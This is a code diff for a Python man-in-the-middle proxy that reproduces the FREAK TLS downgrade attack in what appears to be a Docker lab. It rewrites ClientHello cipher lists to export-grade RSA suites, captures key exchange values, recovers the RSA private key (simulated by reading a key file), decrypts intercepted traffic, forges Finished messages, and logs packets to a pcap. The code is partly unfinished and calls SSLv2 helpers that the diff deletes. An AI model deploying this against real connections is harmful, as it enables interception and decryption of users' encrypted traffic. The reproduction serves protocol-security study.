@@ -3,64 +3,114 @@ import select
 import time
 import threading
 import logging
+import uuid
+import json
 
-from scapy.all import *
+from scapy.all import *  # noqa
+from scapy.all import wrpcap, sniff
 from scapy.layers.tls.all import *
+from tls_session import TLSSession
+from ssl2 import *
 
 LISTEN_HOST = '0.0.0.0'
 LISTEN_PORT = 8443  # Port for browser to connect to proxy
 SERVER_HOST = 'server'  # Docker Compose service name or IP
 SERVER_PORT = 8443      # Real server port
 
-EXPORT_CIPHERS = [ 0x0004, 0x0005, 0x0006, 0x0008, 0x0009, 0x0012, 0x0013, 0x0014, 0x0015 ]
+EXPORT_RSA_CIPHERS = [ 0x0003, 0x0008]
+NON_EXPORT_RSA_CORRESPONDENT = {
+    0x0003: 0x0004,
+    0x0008: 0x0009 
+}
 
 logger = logging.getLogger("mitm-proxy")
 if not logger.hasHandlers():
     logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')
 
-
-ORIGINAL_CIPHER = 0x0009
 broken_keys = {} # Map of n -> (e, d, p, q) for broken RSA keys
 
-def parse_and_modify_clienthello(data):
-    # Parse the TLS record
-    logger.info("Parsing intercepted data")
+def parse_and_modify_clienthello(data, session: TLSSession | None = None):
+    """Parse ClientHello and change supported ciphers to EXPORT only"""
     hello = TLSClientHello(data)
 
     logger.info("TLS ClientHello detected")
     logger.info("Original ciphers: %s", hello.ciphers)
-    orig_len = len(hello.ciphers)
     # Modify the cipher suites to only include EXPORT ciphers
-    # replace every cipher that is not in EXPORT_CIPHERS with cipher 8
     new_ciphers = []
     for cipher in hello.ciphers:
-        if cipher in EXPORT_CIPHERS:
+        if cipher in EXPORT_RSA_CIPHERS:
             new_ciphers.append(cipher)
         else:
-            new_ciphers.append(0x0008)  # Replace with cipher 8
-    hello.ciphers = new_ciphers
+            if NON_EXPORT_RSA_CORRESPONDENT[EXPORT_RSA_CIPHERS[0]] in hello.ciphers:
+                new_ciphers.append(EXPORT_RSA_CIPHERS[0])
+            else:
+                new_ciphers.append(EXPORT_RSA_CIPHERS[1])
+
+
+    # hello.ciphers = new_ciphers
+    hello.ciphers[0] = 0x0008
     logger.info("Modified ciphers: %s", hello.ciphers)
+
+    client_random = hello.gmt_unix_time.to_bytes(4, 'big') + hello.random_bytes
+
+    if session is not None:
+        try:
+            session.client_hello = data
+            session.tampered_client_hello = bytes(hello)
+            session.client_random = client_random
+        except Exception as e:
+            logger.debug(f"Unable to store client hello in session: {e}")
+
     return bytes(hello)
 
-    return data
+def parse_serverhello(data, session: TLSSession | None = None):
+    """Parse ServerHello and modify selected cipher to the corresponding non-export cipher (with normal RSA size), 
+    to avoid UnkownCipher error if server chooses a cipher the client did not ask for"""
 
-def parse_serverhello(data):
-    # Parse the TLS record
-    logger.info("Parsing intercepted server data")
     hello = TLSServerHello(data)
     logger.info("TLS ServerHello detected")
     logger.info("Server selected cipher: %s", hello.cipher)
-    if ORIGINAL_CIPHER is not None:
-        if hello.cipher == 0x0008:
-            logger.info(f"Server accepted downgraded cipher 8, replacing with original cipher {ORIGINAL_CIPHER}")
-            hello.cipher = ORIGINAL_CIPHER
-        else:
-            logger.warning(f"Server did not accept downgraded cipher, selected {hello.cipher} instead of 8")
+
+    if hello.cipher in EXPORT_RSA_CIPHERS:
+        original_cipher = NON_EXPORT_RSA_CORRESPONDENT[hello.cipher]
+        logger.info(f"Server accepted downgraded cipher {hello.cipher}, replacing with corresponding cipher {original_cipher}")
+        #hello.cipher = original_cipher
+    else:
+        logger.warning(f"Server did not accept downgraded cipher, selected {hello.cipher} instead")
+
+    server_random = hello.gmt_unix_time.to_bytes(4, 'big') + hello.random_bytes
+
+    if session is not None:
+        try:
+            session.server_hello = data
+            session.tampered_server_hello = bytes(hello)
+            session.server_random = server_random
+        except Exception as e:
+            logger.debug(f"Unable to store server hello in session: {e}")
+
     return bytes(hello)
 
-def parse_serverkeyexchange(data):
+def parse_clientkeyexchange(data, session: TLSSession | None = None):
+    # first byte is handshake type
+    # next three bytes are length
+    # bytes 4-5 are encrypted pre-master secret length
+    enc_pre_master_length = int.from_bytes(data[4:6], 'big')
+    # next bytes are the encryoted pre-master secret itself
+    enc_pre_master_secret = data[6:6+enc_pre_master_length]
+
+    # logger.info(f"ClientKeyExchange PreMasterSecretLen={enc_pre_master_length}\nPreMasterSecret={enc_pre_master_secret.hex()}")
+
+    if session is not None:
+        try:
+            session.enc_pre_master_secret = enc_pre_master_secret
+            # Try compute/print master secret if we already have key and randoms
+            session.try_print_master_secret(logger)
+        except Exception as e:
+            logger.debug(f"Unable to store client key exchange in session: {e}")
+
+def parse_serverkeyexchange(data, session: TLSSession | None = None):
     # Parse the TLS record
-    logger.info("Parsing intercepted server key exchange data")
+    # logger.info("Parsing intercepted server key exchange data")
     # first byte is handshake type
     # next three bytes are length
     # bytes 4-5 are modulus length
@@ -77,13 +127,33 @@ def parse_serverkeyexchange(data):
     n = int.from_bytes(modulus, 'big')
     public_e = int.from_bytes(public_exponent, 'big')
 
-    threading.Thread(target=break_rsa, args=(n, public_e)).start()
+    if session is not None:
+        session.n = n
+        session.e = public_e
+        if n in broken_keys:
+            session.d = broken_keys[n]['d']
+            session.p = broken_keys[n]['p']
+            session.q = broken_keys[n]['q']
+        else:
+            threading.Thread(target=break_rsa, args=(n, public_e, session)).start()
 
-def break_rsa(n, e):
+def break_rsa(n, e, session: TLSSession | None = None):
     global broken_keys
-    d, p, q = None, None, None     #TODO call math
+    d, p, q = read_private_key()     #TODO call math
 
     broken_keys[n] = {'e': e, 'd': d, 'p': p, 'q': q}
+    if session is not None and session.n == n:
+        session.d, session.p, session.q = d, p, q
+        # Now that we have 'd', see if we can derive master secret
+        session.try_print_master_secret(logger)
+def read_private_key():
+    # simulate key breaking delay
+    time.sleep(10)
+    with open("/keys/key.json", "r") as f:
+        # d is stored as hex string
+        key_data = json.load(f)
+        d = int(key_data['d'], 16)
+    return d, None, None
 
 def recv_exact(sock, n):
     """Read exactly n bytes from a socket or return None if EOF."""
@@ -202,123 +272,13 @@ def tls_handshake_type_name(hstype):
     }
     return mapping.get(hstype, f'handshake_unknown({hstype})')
 
-
-def parse_sslv2_clienthello(body):
-    """Parse SSLv2 ClientHello body and return a list of cipher specs.
-
-    SSLv2 ClientHello layout (body):
-      0: msg_type (1)
-      1-2: version (2)
-      3-4: cipher_spec_length (2)
-      5-6: session_id_length (2)
-      7-8: challenge_length (2)
-      9.. : cipher_specs (cipher_spec_length bytes, 3 bytes each), session_id, challenge
-    """
-    if len(body) < 9:
-        logger.warning("SSlv2 ClientHello too short")
-        return []
-    msg_type = body[0]
-    if msg_type != 1:
-        logger.info(f"SSLv2 message type {msg_type} not ClientHello")
-        return []
-    version = body[1:3]
-    cs_len = int.from_bytes(body[3:5], 'big')
-    sid_len = int.from_bytes(body[5:7], 'big')
-    chal_len = int.from_bytes(body[7:9], 'big')
-    offset = 9
-    cs_bytes = body[offset:offset+cs_len]
-    ciphers = []
-    for i in range(0, len(cs_bytes), 3):
-        spec = cs_bytes[i:i+3]
-        if len(spec) < 3:
-            continue
-        # represent as hex and also map to TLS two-byte suite (last two bytes)
-        spec_hex = spec.hex()
-        tls_suite = int.from_bytes(spec[1:3], 'big')
-        ciphers.append((spec_hex, tls_suite))
-    logger.info(f"SSLv2 ClientHello version={version.hex()} ciphers={ciphers} session_id_len={sid_len} challenge_len={chal_len}")
-    return ciphers
-
-
-def modify_sslv2_clienthello(body, new_tls_suite=0x0004):
-    """Return a modified SSLv2 ClientHello body where all cipher specs are
-    replaced by the given TLS suite (repeated) while keeping lengths same.
-
-    new_tls_suite is a 2-byte value (e.g. 0x0008). We build 3-byte specs as
-    \x00 + suite (0x00 || suite) and repeat to match original cipher_spec_length.
-    """
-    if len(body) < 9:
-        return body
-    msg_type = body[0]
-    if msg_type != 1:
-        return body
-    cs_len = int.from_bytes(body[3:5], 'big')
-    # compute number of full 3-byte specs
-    n_specs = cs_len // 3
-    offset = 9
-    orig_cs = body[offset:offset+cs_len]
-    suite_bytes = int(new_tls_suite).to_bytes(2, 'big')
-    new_cs_parts = []
-    for i in range(0, n_specs):
-        start = i*3
-        orig_spec = orig_cs[start:start+3]
-        if len(orig_spec) < 3:
-            continue
-        # preserve the original first byte (cipher kind) and replace last two bytes
-        new_spec = orig_spec[0:1] + suite_bytes
-        new_cs_parts.append(new_spec)
-    new_cs_bytes = b''.join(new_cs_parts)
-    # if there was a remainder, preserve original tail bytes
-    rem = cs_len - (n_specs * 3)
-    if rem:
-        new_cs_bytes += orig_cs[-rem:]
-    # rebuild body: header(0..8) + new_cs_bytes + rest
-    rest = body[offset+cs_len:]
-    new_body = body[:offset] + new_cs_bytes + rest
-    logger.info(f"Modified SSLv2 ClientHello to offer TLS suite 0x{new_tls_suite:04x} repeated {n_specs} times")
-    return new_body
-
-
-def parse_sslv2_serverhello(body):
-    """Parse SSLv2 ServerHello body and return the chosen cipher (if present).
-
-    SSLv2 ServerHello layout (body):
-      0: msg_type (1)
-      1-2: cipher_spec_length (2)
-      3-4: session_id_length (2)
-      5-6: certificate_length (2)
-      7.. : cipher_specs (cipher_spec_length bytes), session_id, certificate
-    The server typically includes the selected cipher as the first 3-byte cipher_spec.
-    """
-    if len(body) < 7:
-        logger.warning("SSLv2 ServerHello too short")
-        return None
-    msg_type = body[0]
-    if msg_type != 4:
-        logger.info(f"SSLv2 message type {msg_type} not ServerHello")
-        return None
-    cs_len = int.from_bytes(body[1:3], 'big')
-    sid_len = int.from_bytes(body[3:5], 'big')
-    cert_len = int.from_bytes(body[5:7], 'big')
-    offset = 7
-    cs_bytes = body[offset:offset+cs_len]
-    chosen = None
-    if len(cs_bytes) >= 3:
-        spec = cs_bytes[0:3]
-        spec_hex = spec.hex()
-        tls_suite = int.from_bytes(spec[1:3], 'big')
-        chosen = (spec_hex, tls_suite)
-        logger.info(f"SSLv2 ServerHello chosen cipher spec={spec_hex} tls_suite=0x{tls_suite:04x}")
-    else:
-        logger.info("SSLv2 ServerHello contains no cipher specs")
-    return chosen
-
-def forward(src, dst, direction):
+def forward(src, dst, direction, session: TLSSession | None = None):
     try:
         while True:
             hdr, payload, kind = read_record(src)
             if hdr is None:
                 break
+            orig_payload = payload
 
             if kind == 'tls':
                 content_type = hdr[0]
@@ -326,8 +286,26 @@ def forward(src, dst, direction):
                 rtype_name = tls_record_type_name(content_type)
                 logger.info(f"Record {direction}: {rtype_name}, len={rec_len}")
 
+                if direction == 'client->server' and session is not None and session.client_change_cipher_spec:
+                    # try to decrypt
+                    logger.info("Attempting to decrypt client->server data after ChangeCipherSpec")
+                    decrypted = session.decrypt_tls(payload, from_client=True)
+                    logger.info(f"Decrypted client->server data: {decrypted.hex() if decrypted else 'unable to decrypt'}")
+                    orig_payload = payload
+                    payload = decrypted if decrypted is not None else payload
+
+
+
+                elif direction == 'server->client' and session is not None and session.server_change_cipher_spec:
+                    # try to decrypt
+                    logger.info("Attempting to decrypt server->client data after ChangeCipherSpec")
+                    decrypted = session.decrypt_tls(payload, from_client=False)
+                    logger.info(f"Decrypted server->client data: {decrypted.hex() if decrypted else 'unable to decrypt'}")
+                    orig_payload = payload
+                    payload = decrypted if decrypted is not None else payload
+
                 # If it's a handshake record, try to parse handshake messages inside
-                if content_type == 22:  # handshake
+                if rtype_name == 'handshake':
                     # handshake messages can be concatenated; walk them
                     offset = 0
                     while offset + 4 <= len(payload):
@@ -336,17 +314,43 @@ def forward(src, dst, direction):
                         hname = tls_handshake_type_name(htype)
                         logger.info(f"  Handshake message: {hname}, len={hlen}")
                         if hname == 'client_hello':
-                            new_payload = parse_and_modify_clienthello(payload[offset:offset+4+hlen])
-                            payload = payload[:offset] + new_payload + payload[offset+4+hlen:]
+                            new_payload = parse_and_modify_clienthello(payload[offset:offset+4+hlen], session)
+                            session.handshake_messages_client_view += payload[offset:offset+4+hlen]
+                            session.handshake_messages_server_view += new_payload
+                            orig_payload = payload[:offset] + new_payload + payload[offset+4+hlen:]
                         elif hname == 'server_hello':
-                            new_payload = parse_serverhello(payload[offset:offset+4+hlen])
-                            payload = payload[:offset] + new_payload + payload[offset+4+hlen:]
+                            new_payload = parse_serverhello(payload[offset:offset+4+hlen], session)
+                            session.handshake_messages_server_view += payload[offset:offset+4+hlen]
+                            session.handshake_messages_client_view += new_payload
+                            orig_payload = payload[:offset] + new_payload + payload[offset+4+hlen:]
                         elif hname == 'server_key_exchange':
-                            parse_serverkeyexchange(payload[offset:offset+4+hlen])
+                            parse_serverkeyexchange(payload[offset:offset+4+hlen], session)
+                            session.handshake_messages_server_view += payload[offset:offset+4+hlen]
+                            session.handshake_messages_client_view += payload[offset:offset+4+hlen]
+                        elif hname == 'client_key_exchange':
+                            parse_clientkeyexchange(payload[offset:offset+4+hlen], session)
+                            session.handshake_messages_client_view += payload[offset:offset+4+hlen]
+                            session.handshake_messages_server_view += payload[offset:offset+4+hlen]
+                        elif hname == 'finished':
+                            logger.info(f"Finished message detected: {payload[offset:offset+4+hlen].hex()}")
+                            new_verify = session.compute_verify_data(from_client=(direction=='client->server'))
+                            # first byte is handshake type, next 3 bytes are length
+                            new_payload = payload[:offset+4] + new_verify + payload[offset+4+hlen:]
+                            orig_payload = session.re_encrypt_first_tls(new_payload, from_client=(direction=='client->server'))
+                        else:
+                            session.handshake_messages_client_view += payload[offset:offset+4+hlen]
+                            session.handshake_messages_server_view += payload[offset:offset+4+hlen]
+
                         #advance to next handshake message
                         offset += 4 + hlen
                         if hlen == 0:
                             break
+
+                elif rtype_name == 'change_cipher_spec':
+                    if direction == 'client->server':
+                        session.client_change_cipher_spec = True
+                    else:
+                        session.server_change_cipher_spec = True
 
             else:  # sslv2
                 rec_len = len(payload)
@@ -356,15 +360,15 @@ def forward(src, dst, direction):
                     msg_type = payload[0]
                     if msg_type == 1:  # ClientHello
                         ciphers = parse_sslv2_clienthello(payload)
-                        logger.info(f"  SSLv2 ClientHello ciphers: {ciphers}")
-                        # modify clienthello to only offer TLS cipher 0x0003 (export)
-                        new_payload = modify_sslv2_clienthello(payload, new_tls_suite=0x0003)
-                        payload = new_payload
+                        logger.info(f"SSLv2 ClientHello ciphers: {ciphers}")
+                        # modify clienthello to only offer EXP-RC4-MD5 cipher
+                        new_payload = modify_sslv2_clienthello(payload)
+                        orig_payload = new_payload
                     elif msg_type == 4:  # ServerHello
                         chosen = parse_sslv2_serverhello(payload)
-                        logger.info(f"  SSLv2 ServerHello chosen: {chosen}")
+                        logger.info(f"SSLv2 ServerHello chosen: {chosen}")
 
-            dst.sendall(hdr + payload)
+            dst.sendall(hdr + orig_payload)
     except Exception as e:
         logger.warning(f"Exception in forwarding ({direction}): {e}")
     finally:
@@ -375,15 +379,26 @@ def handle_client(client_sock, client_addr):
     try:
         server_sock = socket.create_connection((SERVER_HOST, SERVER_PORT))
         logger.info(f"Accepted connection from {client_addr}, forwarding to {SERVER_HOST}:{SERVER_PORT}")
-        threading.Thread(target=forward, args=(client_sock, server_sock, 'client->server')).start()
-        threading.Thread(target=forward, args=(server_sock, client_sock, 'server->client')).start()
+
+        # Create session with unique ID and context
+        session_id = f"{int(time.time())}-{uuid.uuid4().hex[:8]}"
+        session = TLSSession(session_id=session_id)
+        session.client_addr = client_addr
+
+        # Start forwarding threads with session context
+        t1 = threading.Thread(target=forward, args=(client_sock, server_sock, 'client->server', session))
+        t2 = threading.Thread(target=forward, args=(server_sock, client_sock, 'server->client', session))
+        t1.start(); t2.start()
+
+        # Wait for both directions to complete to close the session cleanly
+        t1.join(); t2.join()
     except Exception as e:
         logger.error(f"Error handling client {client_addr}: {e}")
         client_sock.close()
 
-packets = []
 def packet_callback(pkt):
-    packets.append(pkt)
+    #save to pcap file
+    wrpcap(f"/pcap/freak_mitm.pcap", pkt, append=True)
 
 def main():
     listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -391,17 +406,17 @@ def main():
     listen_sock.bind((LISTEN_HOST, LISTEN_PORT))
     listen_sock.listen(5)
     logger.info(f"Proxy listening on {LISTEN_HOST}:{LISTEN_PORT}, forwarding to {SERVER_HOST}:{SERVER_PORT}")
+
+    # setup a packet sniffer to capture all traffic on eth0 and save to pcap file
     sniffer = threading.Thread(target=sniff, kwargs={
-    'iface': 'eth0',
-    'prn': packet_callback,
-    'store': False
+        'iface': 'eth0',
+        'prn': packet_callback,
+        'store': False
     })
     sniffer.start()
+
     while True:
         client_sock, addr = listen_sock.accept()
-        if packets:
-            wrpcap(f"/pcap/freak_mitm_{int(time.time())}.pcap", packets)
-            packets.clear()
         logger.info(f"Accepted connection from {addr}")
         threading.Thread(target=handle_client, args=(client_sock, addr)).start()
 
